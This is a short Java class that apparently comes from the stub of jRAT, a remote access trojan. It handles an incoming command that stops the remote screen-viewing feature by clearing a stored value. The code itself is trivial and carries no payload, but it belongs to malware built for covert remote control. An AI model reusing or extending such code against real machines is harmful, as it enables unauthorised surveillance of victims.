package se.jrat.stub.packets.incoming;

import se.jrat.stub.Screen;

public class Packet26StopRemoteScreen extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Screen.prevSums = null;
	}

}
